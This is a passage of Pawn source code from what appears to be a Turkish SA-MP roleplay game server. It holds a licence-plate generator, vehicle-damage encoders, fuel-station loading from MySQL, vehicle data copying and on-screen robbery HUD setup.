	{"O"},
	{"P"},
	{"R"},
	{"S"},
	{"T"},
	{"U"},
	{"V"},
	{"W"},
	{"Q"},
	{"X"},
	{"Y"},
	{"Z"}
	};
	new p2[10][] = {
	{"0"},
	{"1"},
	{"2"},
	{"3"},
	{"4"},
	{"5"},
	{"6"},
	{"7"},
	{"8"},
	{"9"}
	};
	new string[20];
	new rand = random(2); // 2 tip plaka tipi 0. : HAG7 90J 1. : HA57 9KJ
	switch(rand)
	{

		case 0:
		{
			for(new i=0;i<8;i++)
			{
				switch(i)
				{
					case 0: format(string,sizeof(string),"%s",p1[random(26)]);
					case 1: format(string,sizeof(string),"%s%s",string,p1[random(26)]);
					case 2: format(string,sizeof(string),"%s%s",string,p1[random(26)]);
					case 3: format(string,sizeof(string),"%s%s",string,p2[random(10)]);
					case 4: format(string,sizeof(string),"%s ",string);
					case 5: format(string,sizeof(string),"%s%s",string,p2[random(10)]);
					case 6: format(string,sizeof(string),"%s%s",string,p2[random(10)]);
					case 7: format(string,sizeof(string),"%s%s",string,p1[random(26)]);
				}
			}
		}
		case 1:
		{
			for(new i=0;i<8;i++)
			{
				switch(i)
				{
					case 0: format(string,sizeof(string),"%s",p1[random(26)]);
					case 1: format(string,sizeof(string),"%s%s",string,p1[random(26)]);
					case 2: format(string,sizeof(string),"%s%s",string,p2[random(10)]);
					case 3: format(string,sizeof(string),"%s%s",string,p2[random(10)]);
					case 4: format(string,sizeof(string),"%s ",string);
					case 5: format(string,sizeof(string),"%s%s",string,p2[random(10)]);
					case 6: format(string,sizeof(string),"%s%s",string,p1[random(26)]);
					case 7: format(string,sizeof(string),"%s%s",string,p1[random(26)]);
				}
			}
		}
	}
	return string;
}

GetPlayerVehicleModel(playerid)
{
	return GetVehicleModel(GetPlayerVehicleID(playerid));
}

stock encode_tires(tire1, tire2, tire3, tire4) return tire1 | (tire2 << 1) | (tire3 << 2) | (tire4 << 3);

stock encode_panels(flp, frp, rlp, rrp, windshield, front_bumper, rear_bumper)
{
    return flp | (frp << 4) | (rlp << 8) | (rrp << 12) | (windshield << 16) | (front_bumper << 20) | (rear_bumper << 24);
}

stock encode_doors(bonnet, boot, driver_door, passenger_door, behind_driver_door, behind_passenger_door)
{
    #pragma unused behind_driver_door
    #pragma unused behind_passenger_door
    return bonnet | (boot << 8) | (driver_door << 16) | (passenger_door << 24);
}

stock encode_lights(light1, light2, light3, light4)
{
    return light1 | (light2 << 1) | (light3 << 2) | (light4 << 3);
}

BenzinistasyonuYukle()
{
	new Cache:cache = mysql_query("SELECT * FROM `benzinistasyonlari`",true);
	new x;
	for(new i;i<cache_get_row_count();i++)
	{
	    x = cache_get_field_content_int(i,"id");
	    Benzinistasyonu[x][bPosX] = cache_get_field_content_float(i,"posx");
	    Benzinistasyonu[x][bPosY] = cache_get_field_content_float(i,"posy");
	    Benzinistasyonu[x][bPosZ] = cache_get_field_content_float(i,"posz");
		Benzinistasyonu[x][bDurum] = cache_get_field_content_int(i,"durum");
	}
	cache_delete(cache);
	return 1;
}

SonrakistasyonID()
{
	new i=0;
	while(i != 50)
	{
		if(Benzinistasyonu[i][bDurum] == 0)
		{
			return i;
		}
		i++;
	}
	return -1;
}

adminspec_strtok(const string[], &index)
{
	new lengthspec = strlen(string);
	while ((index < lengthspec) && (string[index] <= ' '))
	{
		index++;
	}

	new offsetspec = index;
	new resultspec[20];
	while ((index < lengthspec) && (string[index] > ' ') && ((index - offsetspec) < (sizeof(resultspec) - 1)))
	{
		resultspec[index - offsetspec] = string[index];
		index++;
	}
	resultspec[index - offsetspec] = EOS;
	return resultspec;
}

MesajGonder(playerid, color, string[])
{
	if(Girdi[playerid])
	{
		if(strlen(string) > 100)
		{
			new str[256];
			strmid(str, string, 0, 100, 101);
			strins(str, " ...", strlen(str), 256);
			SendClientMessage(playerid, color, str);
			strmid(str, string, 100, strlen(string), 256);
			strins(str, "... ", 0, 256);
			SendClientMessage(playerid, color, str);
		}
		else SendClientMessage(playerid, color, string);
	}
}

GetClosestistasyonID(playerid)
{
	new i=0;
	while(i != MAX_BENZIN_ISTASYONU)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Benzinistasyonu[i][bPosX], Benzinistasyonu[i][bPosY], Benzinistasyonu[i][bPosZ]))
		{
			return i;
		}
		i++;
	}
	return -1;
}

ReCreateVehicle(vehicleid)
{
	DestroyVehicle(vehicleid);
	new new_vehicle_id = CreateVehicle(Arac[vehicleid][amodel], Arac[vehicleid][aposx], Arac[vehicleid][aposy], Arac[vehicleid][aposz], Arac[vehicleid][aposa], Arac[vehicleid][arenk1], Arac[vehicleid][arenk2], -1, Arac[vehicleid][siren]);
	SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
	if(vehicleid != new_vehicle_id)
	{
		TransferVehicleInfo(vehicleid, new_vehicle_id);
		DeleteVehicleInfo(vehicleid);
	}
	return 1;
}

TransferVehicleInfo(vehicleid, to_vehicleid)
{
	Arac[to_vehicleid][aid]				= Arac[vehicleid][aid];
	Arac[to_vehicleid][amodel]			= Arac[vehicleid][amodel];
	Arac[to_vehicleid][aposx]			= Arac[vehicleid][aposx];
	Arac[to_vehicleid][aposy]			= Arac[vehicleid][aposy];
	Arac[to_vehicleid][aposz]			= Arac[vehicleid][aposz];
	Arac[to_vehicleid][aposa]			= Arac[vehicleid][aposa];
	Arac[to_vehicleid][ainterior]		= Arac[vehicleid][ainterior];
	Arac[to_vehicleid][avworld]			= Arac[vehicleid][avworld];
	Arac[to_vehicleid][arenk1]			= Arac[vehicleid][arenk1];
	Arac[to_vehicleid][arenk2]			= Arac[vehicleid][arenk2];
	Arac[to_vehicleid][afiyat]			= Arac[vehicleid][afiyat];
	strmid(Arac[to_vehicleid][aplaka], Arac[vehicleid][aplaka], 0, strlen(Arac[vehicleid][aplaka]), 32);
	Arac[to_vehicleid][aowner]			= Arac[vehicleid][aowner];
	Arac[to_vehicleid][ahasar]			= Arac[vehicleid][ahasar];
	Arac[to_vehicleid][aalarm]			= Arac[vehicleid][aalarm];
	Arac[to_vehicleid][akilit]			= Arac[vehicleid][akilit];
	Arac[to_vehicleid][abenzin]			= Arac[vehicleid][abenzin];
	Arac[to_vehicleid][apaintjob]		= Arac[vehicleid][apaintjob];
	Arac[to_vehicleid][aexhaust]		= Arac[vehicleid][aexhaust];
	Arac[to_vehicleid][afrontbumper]	= Arac[vehicleid][afrontbumper];
	Arac[to_vehicleid][arearbumper]		= Arac[vehicleid][arearbumper];
	Arac[to_vehicleid][aroof]			= Arac[vehicleid][aroof];
	Arac[to_vehicleid][aspoilers]		= Arac[vehicleid][aspoilers];
	Arac[to_vehicleid][asideskirts]		= Arac[vehicleid][asideskirts];
	Arac[to_vehicleid][abullbars]		= Arac[vehicleid][abullbars];
	Arac[to_vehicleid][atekerlek]		= Arac[vehicleid][atekerlek];
	Arac[to_vehicleid][acarstereo]		= Arac[vehicleid][acarstereo];
	Arac[to_vehicleid][ahidrolik]		= Arac[vehicleid][ahidrolik];
	Arac[to_vehicleid][anitro]			= Arac[vehicleid][anitro];
	Arac[to_vehicleid][apanels]			= Arac[vehicleid][apanels];
	Arac[to_vehicleid][adoors]			= Arac[vehicleid][adoors];
	Arac[to_vehicleid][alights]			= Arac[vehicleid][alights];
	Arac[to_vehicleid][atires]			= Arac[vehicleid][atires];
	Arac[to_vehicleid][atip]		= Arac[vehicleid][atip];
	Arac[to_vehicleid][afiyat]			= Arac[vehicleid][afiyat];
	Arac[to_vehicleid][aspawnsatin]		= Arac[vehicleid][aspawnsatin];
	Arac[to_vehicleid][aimmo]		= Arac[vehicleid][aimmo];
	Arac[to_vehicleid][acezamiktar]		= Arac[vehicleid][acezamiktar];
	Arac[to_vehicleid][siren]		= Arac[vehicleid][siren];
	Arac[to_vehicleid][yedekanahtar]		= Arac[vehicleid][yedekanahtar];
	Arac[to_vehicleid][akm]		= Arac[vehicleid][akm];
	Arac[to_vehicleid][ametre]		= Arac[vehicleid][ametre];
	Arac[to_vehicleid][atextdurum]			= Arac[vehicleid][atextdurum];
	Arac[to_vehicleid][abirlik]			= Arac[vehicleid][abirlik];
	Arac[to_vehicleid][abirliktip]			= Arac[vehicleid][abirliktip];
	Arac[to_vehicleid][asure]			= Arac[vehicleid][asure];
	Arac[to_vehicleid][aneon]           =   Arac[vehicleid][aneon];
	Arac[to_vehicleid][ahizsabit]		= Arac[vehicleid][ahizsabit];
	Arac[to_vehicleid][abenzintip]		= Arac[vehicleid][abenzintip];
	Arac[to_vehicleid][arutbe]			= Arac[vehicleid][arutbe];
	Arac[to_vehicleid][vergi]			= Arac[vehicleid][vergi];
	Arac[to_vehicleid][aisyeri]			= Arac[vehicleid][aisyeri];
	Arac[to_vehicleid][agelir]			= Arac[vehicleid][agelir];
	Arac[to_vehicleid][birlikdestek]           =   Arac[vehicleid][birlikdestek];
	Arac[to_vehicleid][sigorta]           =   Arac[vehicleid][sigorta];
	Arac[to_vehicleid][parcalandi]           =   Arac[vehicleid][parcalandi];
	//yaptým
	Arac[to_vehicleid][silah1]           =   Arac[vehicleid][silah1];
	Arac[to_vehicleid][mermi1]           =   Arac[vehicleid][mermi1];
	Arac[to_vehicleid][silah2]           =   Arac[vehicleid][silah2];
	Arac[to_vehicleid][mermi2]           =   Arac[vehicleid][mermi2];
	Arac[to_vehicleid][silah3]           =   Arac[vehicleid][silah3];
	Arac[to_vehicleid][mermi3]           =   Arac[vehicleid][mermi3];
	//yaptým fin
	strmid(Arac[to_vehicleid][aceza], Arac[vehicleid][aceza], 0, strlen(Arac[vehicleid][aceza]), 32);
	strmid(Arac[to_vehicleid][atextyazi], Arac[vehicleid][aplaka], 0, strlen(Arac[vehicleid][atextyazi]), 32);

	Arac[to_vehicleid][abenzintip]      =   Arac[vehicleid][abenzintip];
	Arac[to_vehicleid][ahizsabit]       =   Arac[vehicleid][ahizsabit];
	Materyal[to_vehicleid][A]           =   Materyal[vehicleid][A];
	Materyal[to_vehicleid][B]           =   Materyal[vehicleid][B];
	Materyal[to_vehicleid][C]           =   Materyal[vehicleid][C];
	Materyal[to_vehicleid][D]           =   Materyal[vehicleid][D];
	Materyal[to_vehicleid][E]           =   Materyal[vehicleid][E];
	Kutular[to_vehicleid]               = 	Kutular[vehicleid];
	Esyalar[to_vehicleid]               = 	Esyalar[vehicleid];
	//
	acol1[to_vehicleid]                  =   acol1[vehicleid];
	acol2[to_vehicleid]                  =   acol2[vehicleid];
	//
	cezali[to_vehicleid]                = 	cezali[vehicleid];
	return 1;
}

SoygunTextDrawYukle(playerid)
{
    SoygunBox[playerid][0] = CreatePlayerTextDraw(playerid, 159.647476, -28.750007, "BOX(1)");
	PlayerTextDrawLetterSize(playerid, SoygunBox[playerid][0], 0.434116, 9.054999);
	PlayerTextDrawTextSize(playerid, SoygunBox[playerid][0], 406.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, SoygunBox[playerid][0], 1);
	PlayerTextDrawColor(playerid, SoygunBox[playerid][0], -1347440641);
	PlayerTextDrawUseBox(playerid, SoygunBox[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid, SoygunBox[playerid][0], -1347440827);
	PlayerTextDrawSetShadow(playerid, SoygunBox[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, SoygunBox[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, SoygunBox[playerid][0], -1347440879);
	PlayerTextDrawFont(playerid, SoygunBox[playerid][0], 1);
	PlayerTextDrawSetProportional(playerid, SoygunBox[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, SoygunBox[playerid][0], 0);

	OyuncuSkin[playerid][0] = CreatePlayerTextDraw(playerid, 163.723495, -4.250020, "");
	PlayerTextDrawLetterSize(playerid, OyuncuSkin[playerid][0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, OyuncuSkin[playerid][0], 55.000000, 61.000000);
	PlayerTextDrawAlignment(playerid, OyuncuSkin[playerid][0], 1);
	PlayerTextDrawColor(playerid, OyuncuSkin[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, OyuncuSkin[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuSkin[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuSkin[playerid][0], 0);
	PlayerTextDrawFont(playerid, OyuncuSkin[playerid][0], 5);
	PlayerTextDrawSetProportional(playerid, OyuncuSkin[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, OyuncuSkin[playerid][0], 0);
	PlayerTextDrawSetPreviewModel(playerid, OyuncuSkin[playerid][0], 124);
	PlayerTextDrawSetPreviewRot(playerid, OyuncuSkin[playerid][0], 0.000000, 0.000000, 0.000000, 1.000000);

	OyuncuLevel[playerid][0] = CreatePlayerTextDraw(playerid, 164.352844, 1.583348, "10");
	PlayerTextDrawLetterSize(playerid, OyuncuLevel[playerid][0], 0.247998, 1.284999);
	PlayerTextDrawAlignment(playerid, OyuncuLevel[playerid][0], 1);
	PlayerTextDrawColor(playerid, OyuncuLevel[playerid][0], -320017153);
	PlayerTextDrawSetShadow(playerid, OyuncuLevel[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuLevel[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuLevel[playerid][0], 255);
	PlayerTextDrawFont(playerid, OyuncuLevel[playerid][0], 3);
	PlayerTextDrawSetProportional(playerid, OyuncuLevel[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, OyuncuLevel[playerid][0], 0);

	OyuncuSilahTD[playerid][0] = CreatePlayerTextDraw(playerid, 158.176422, 21.416687, "");
	PlayerTextDrawLetterSize(playerid, OyuncuSilahTD[playerid][0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, OyuncuSilahTD[playerid][0], 38.000000, 33.000000);
	PlayerTextDrawAlignment(playerid, OyuncuSilahTD[playerid][0], 1);
	PlayerTextDrawColor(playerid, OyuncuSilahTD[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, OyuncuSilahTD[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuSilahTD[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuSilahTD[playerid][0], 0);
	PlayerTextDrawFont(playerid, OyuncuSilahTD[playerid][0], 5);
	PlayerTextDrawSetProportional(playerid, OyuncuSilahTD[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, OyuncuSilahTD[playerid][0], 0);
	PlayerTextDrawSetPreviewModel(playerid, OyuncuSilahTD[playerid][0], 372);
	PlayerTextDrawSetPreviewRot(playerid, OyuncuSilahTD[playerid][0], 0.000000, 0.000000, 0.000000, 1.399999);

	SoygunBox[playerid][1] = CreatePlayerTextDraw(playerid, 211.794006, -0.749996, "box");
	PlayerTextDrawLetterSize(playerid, SoygunBox[playerid][1], 0.000000, 5.952939);
	PlayerTextDrawTextSize(playerid, SoygunBox[playerid][1], 208.499908, 0.000000);
	PlayerTextDrawAlignment(playerid, SoygunBox[playerid][1], 1);
	PlayerTextDrawColor(playerid, SoygunBox[playerid][1], -1);
	PlayerTextDrawUseBox(playerid, SoygunBox[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid, SoygunBox[playerid][1], 255);
	PlayerTextDrawSetShadow(playerid, SoygunBox[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, SoygunBox[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, SoygunBox[playerid][1], 255);
	PlayerTextDrawFont(playerid, SoygunBox[playerid][1], 1);
	PlayerTextDrawSetProportional(playerid, SoygunBox[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, SoygunBox[playerid][1], 0);

	OyuncuSkin[playerid][1] = CreatePlayerTextDraw(playerid, 215.626663, -4.250020, "");
	PlayerTextDrawLetterSize(playerid, OyuncuSkin[playerid][1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, OyuncuSkin[playerid][1], 55.000000, 61.000000);
	PlayerTextDrawAlignment(playerid, OyuncuSkin[playerid][1], 1);
	PlayerTextDrawColor(playerid, OyuncuSkin[playerid][1], -1);
	PlayerTextDrawSetShadow(playerid, OyuncuSkin[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuSkin[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuSkin[playerid][1], 0);
	PlayerTextDrawFont(playerid, OyuncuSkin[playerid][1], 5);
	PlayerTextDrawSetProportional(playerid, OyuncuSkin[playerid][1], 0);
	PlayerTextDrawSetShadow(playerid, OyuncuSkin[playerid][1], 0);
	PlayerTextDrawSetPreviewModel(playerid, OyuncuSkin[playerid][1], 124);
	PlayerTextDrawSetPreviewRot(playerid, OyuncuSkin[playerid][1], 0.000000, 0.000000, 0.000000, 1.000000);

	OyuncuLevel[playerid][1] = CreatePlayerTextDraw(playerid, 217.256072, 1.583348, "10");
	PlayerTextDrawLetterSize(playerid, OyuncuLevel[playerid][1], 0.247998, 1.284999);
	PlayerTextDrawAlignment(playerid, OyuncuLevel[playerid][1], 1);
	PlayerTextDrawColor(playerid, OyuncuLevel[playerid][1], -320017153);
	PlayerTextDrawSetShadow(playerid, OyuncuLevel[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuLevel[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuLevel[playerid][1], 255);
	PlayerTextDrawFont(playerid, OyuncuLevel[playerid][1], 3);
	PlayerTextDrawSetProportional(playerid, OyuncuLevel[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, OyuncuLevel[playerid][1], 0);

	OyuncuSilahTD[playerid][1] = CreatePlayerTextDraw(playerid, 211.000061, 21.416687, "");
	PlayerTextDrawLetterSize(playerid, OyuncuSilahTD[playerid][1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, OyuncuSilahTD[playerid][1], 38.000000, 33.000000);
	PlayerTextDrawAlignment(playerid, OyuncuSilahTD[playerid][1], 1);
	PlayerTextDrawColor(playerid, OyuncuSilahTD[playerid][1], -1);
	PlayerTextDrawSetShadow(playerid, OyuncuSilahTD[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuSilahTD[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuSilahTD[playerid][1], 0);
	PlayerTextDrawFont(playerid, OyuncuSilahTD[playerid][1], 5);
	PlayerTextDrawSetProportional(playerid, OyuncuSilahTD[playerid][1], 0);
	PlayerTextDrawSetShadow(playerid, OyuncuSilahTD[playerid][1], 0);
	PlayerTextDrawSetPreviewModel(playerid, OyuncuSilahTD[playerid][1], 372);
	PlayerTextDrawSetPreviewRot(playerid, OyuncuSilahTD[playerid][1], 0.000000, 0.000000, 0.000000, 1.399999);

	SoygunBox[playerid][2] = CreatePlayerTextDraw(playerid, 262.600158, -0.749996, "box");
	PlayerTextDrawLetterSize(playerid, SoygunBox[playerid][2], 0.000000, 5.952939);
	PlayerTextDrawTextSize(playerid, SoygunBox[playerid][2], 259.306060, 0.000000);
	PlayerTextDrawAlignment(playerid, SoygunBox[playerid][2], 1);
	PlayerTextDrawColor(playerid, SoygunBox[playerid][2], -1);
	PlayerTextDrawUseBox(playerid, SoygunBox[playerid][2], 1);
	PlayerTextDrawBoxColor(playerid, SoygunBox[playerid][2], 255);
	PlayerTextDrawSetShadow(playerid, SoygunBox[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, SoygunBox[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, SoygunBox[playerid][2], 255);
	PlayerTextDrawFont(playerid, SoygunBox[playerid][2], 1);
	PlayerTextDrawSetProportional(playerid, SoygunBox[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, SoygunBox[playerid][2], 0);

	OyuncuSkin[playerid][2] = CreatePlayerTextDraw(playerid, 265.900360, -4.250020, "");
	PlayerTextDrawLetterSize(playerid, OyuncuSkin[playerid][2], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, OyuncuSkin[playerid][2], 55.000000, 61.000000);
	PlayerTextDrawAlignment(playerid, OyuncuSkin[playerid][2], 1);
	PlayerTextDrawColor(playerid, OyuncuSkin[playerid][2], -1);
	PlayerTextDrawSetShadow(playerid, OyuncuSkin[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuSkin[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuSkin[playerid][2], 0);
	PlayerTextDrawFont(playerid, OyuncuSkin[playerid][2], 5);
	PlayerTextDrawSetProportional(playerid, OyuncuSkin[playerid][2], 0);
	PlayerTextDrawSetShadow(playerid, OyuncuSkin[playerid][2], 0);
	PlayerTextDrawSetPreviewModel(playerid, OyuncuSkin[playerid][2], 124);
	PlayerTextDrawSetPreviewRot(playerid, OyuncuSkin[playerid][2], 0.000000, 0.000000, 0.000000, 1.000000);

	OyuncuLevel[playerid][2] = CreatePlayerTextDraw(playerid, 267.700164, 1.583348, "10");
	PlayerTextDrawLetterSize(playerid, OyuncuLevel[playerid][2], 0.247998, 1.284999);
	PlayerTextDrawAlignment(playerid, OyuncuLevel[playerid][2], 1);
	PlayerTextDrawColor(playerid, OyuncuLevel[playerid][2], -320017153);
	PlayerTextDrawSetShadow(playerid, OyuncuLevel[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuLevel[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuLevel[playerid][2], 255);
	PlayerTextDrawFont(playerid, OyuncuLevel[playerid][2], 3);
	PlayerTextDrawSetProportional(playerid, OyuncuLevel[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, OyuncuLevel[playerid][2], 0);

	OyuncuSilahTD[playerid][2] = CreatePlayerTextDraw(playerid, 263.999938, 21.416687, "");
	PlayerTextDrawLetterSize(playerid, OyuncuSilahTD[playerid][2], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, OyuncuSilahTD[playerid][2], 38.000000, 33.000000);
	PlayerTextDrawAlignment(playerid, OyuncuSilahTD[playerid][2], 1);
	PlayerTextDrawColor(playerid, OyuncuSilahTD[playerid][2], -1);
	PlayerTextDrawSetShadow(playerid, OyuncuSilahTD[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuSilahTD[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuSilahTD[playerid][2], 0);
	PlayerTextDrawFont(playerid, OyuncuSilahTD[playerid][2], 5);
	PlayerTextDrawSetProportional(playerid, OyuncuSilahTD[playerid][2], 0);
	PlayerTextDrawSetShadow(playerid, OyuncuSilahTD[playerid][2], 0);
	PlayerTextDrawSetPreviewModel(playerid, OyuncuSilahTD[playerid][2], 372);
	PlayerTextDrawSetPreviewRot(playerid, OyuncuSilahTD[playerid][2], 0.000000, 0.000000, 0.000000, 1.399999);

	SoygunBox[playerid][3] = CreatePlayerTextDraw(playerid, 311.700103, -0.749996, "box");
	PlayerTextDrawLetterSize(playerid, SoygunBox[playerid][3], 0.000000, 5.952939);
	PlayerTextDrawTextSize(playerid, SoygunBox[playerid][3], 308.406005, 0.000000);
	PlayerTextDrawAlignment(playerid, SoygunBox[playerid][3], 1);
	PlayerTextDrawColor(playerid, SoygunBox[playerid][3], -1);
	PlayerTextDrawUseBox(playerid, SoygunBox[playerid][3], 1);
	PlayerTextDrawBoxColor(playerid, SoygunBox[playerid][3], 255);
	PlayerTextDrawSetShadow(playerid, SoygunBox[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, SoygunBox[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, SoygunBox[playerid][3], 255);
	PlayerTextDrawFont(playerid, SoygunBox[playerid][3], 1);
	PlayerTextDrawSetProportional(playerid, SoygunBox[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, SoygunBox[playerid][3], 0);

	SoygunBox[playerid][4] = CreatePlayerTextDraw(playerid, 359.332458, -0.749996, "box");
	PlayerTextDrawLetterSize(playerid, SoygunBox[playerid][4], 0.000000, 5.952939);
	PlayerTextDrawTextSize(playerid, SoygunBox[playerid][4], 355.799987, 0.000000);
	PlayerTextDrawAlignment(playerid, SoygunBox[playerid][4], 1);
	PlayerTextDrawColor(playerid, SoygunBox[playerid][4], -1);
	PlayerTextDrawUseBox(playerid, SoygunBox[playerid][4], 1);
	PlayerTextDrawBoxColor(playerid, SoygunBox[playerid][4], 255);
	PlayerTextDrawSetShadow(playerid, SoygunBox[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, SoygunBox[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, SoygunBox[playerid][4], 255);
	PlayerTextDrawFont(playerid, SoygunBox[playerid][4], 1);
	PlayerTextDrawSetProportional(playerid, SoygunBox[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, SoygunBox[playerid][4], 0);

	OyuncuSilahTD[playerid][3] = CreatePlayerTextDraw(playerid, 311.602844, 21.416687, "");
	PlayerTextDrawLetterSize(playerid, OyuncuSilahTD[playerid][3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, OyuncuSilahTD[playerid][3], 38.000000, 33.000000);
	PlayerTextDrawAlignment(playerid, OyuncuSilahTD[playerid][3], 1);
	PlayerTextDrawColor(playerid, OyuncuSilahTD[playerid][3], -1);
	PlayerTextDrawSetShadow(playerid, OyuncuSilahTD[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuSilahTD[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuSilahTD[playerid][3], 0);
	PlayerTextDrawFont(playerid, OyuncuSilahTD[playerid][3], 5);
	PlayerTextDrawSetProportional(playerid, OyuncuSilahTD[playerid][3], 0);
	PlayerTextDrawSetShadow(playerid, OyuncuSilahTD[playerid][3], 0);
	PlayerTextDrawSetPreviewModel(playerid, OyuncuSilahTD[playerid][3], 372);
	PlayerTextDrawSetPreviewRot(playerid, OyuncuSilahTD[playerid][3], 0.000000, 0.000000, 0.000000, 1.399999);

	OyuncuLevel[playerid][3] = CreatePlayerTextDraw(playerid, 315.403076, 1.583348, "10");
	PlayerTextDrawLetterSize(playerid, OyuncuLevel[playerid][3], 0.247998, 1.284999);
	PlayerTextDrawAlignment(playerid, OyuncuLevel[playerid][3], 1);
	PlayerTextDrawColor(playerid, OyuncuLevel[playerid][3], -320017153);
	PlayerTextDrawSetShadow(playerid, OyuncuLevel[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuLevel[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuLevel[playerid][3], 255);
	PlayerTextDrawFont(playerid, OyuncuLevel[playerid][3], 3);
	PlayerTextDrawSetProportional(playerid, OyuncuLevel[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, OyuncuLevel[playerid][3], 0);

	OyuncuSkin[playerid][3] = CreatePlayerTextDraw(playerid, 314.003295, -4.250020, "");
	PlayerTextDrawLetterSize(playerid, OyuncuSkin[playerid][3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, OyuncuSkin[playerid][3], 55.000000, 61.000000);
	PlayerTextDrawAlignment(playerid, OyuncuSkin[playerid][3], 1);
	PlayerTextDrawColor(playerid, OyuncuSkin[playerid][3], -1);
	PlayerTextDrawSetShadow(playerid, OyuncuSkin[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuSkin[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuSkin[playerid][3], 0);
	PlayerTextDrawFont(playerid, OyuncuSkin[playerid][3], 5);
	PlayerTextDrawSetProportional(playerid, OyuncuSkin[playerid][3], 0);
	PlayerTextDrawSetShadow(playerid, OyuncuSkin[playerid][3], 0);
	PlayerTextDrawSetPreviewModel(playerid, OyuncuSkin[playerid][3], 124);
	PlayerTextDrawSetPreviewRot(playerid, OyuncuSkin[playerid][3], 0.000000, 0.000000, 0.000000, 1.000000);

	OyuncuSkin[playerid][4] = CreatePlayerTextDraw(playerid, 362.906280, -4.250020, "");
	PlayerTextDrawLetterSize(playerid, OyuncuSkin[playerid][4], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, OyuncuSkin[playerid][4], 55.000000, 61.000000);
	PlayerTextDrawAlignment(playerid, OyuncuSkin[playerid][4], 1);
	PlayerTextDrawColor(playerid, OyuncuSkin[playerid][4], -1);
	PlayerTextDrawSetShadow(playerid, OyuncuSkin[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuSkin[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuSkin[playerid][4], 0);
	PlayerTextDrawFont(playerid, OyuncuSkin[playerid][4], 5);
	PlayerTextDrawSetProportional(playerid, OyuncuSkin[playerid][4], 0);
	PlayerTextDrawSetShadow(playerid, OyuncuSkin[playerid][4], 0);
	PlayerTextDrawSetPreviewModel(playerid, OyuncuSkin[playerid][4], 124);
	PlayerTextDrawSetPreviewRot(playerid, OyuncuSkin[playerid][4], 0.000000, 0.000000, 0.000000, 1.000000);

	OyuncuLevel[playerid][4] = CreatePlayerTextDraw(playerid, 362.964874, 1.383352, "10");
	PlayerTextDrawLetterSize(playerid, OyuncuLevel[playerid][4], 0.247998, 1.284999);
	PlayerTextDrawAlignment(playerid, OyuncuLevel[playerid][4], 1);
	PlayerTextDrawColor(playerid, OyuncuLevel[playerid][4], -320017153);
	PlayerTextDrawSetShadow(playerid, OyuncuLevel[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, OyuncuLevel[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, OyuncuLevel[playerid][4], 255);
	PlayerTextDrawFont(playerid, OyuncuLevel[playerid][4], 3);
	PlayerTextDrawSetProportional(playerid, OyuncuLevel[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, OyuncuLevel[playerid][4], 0);

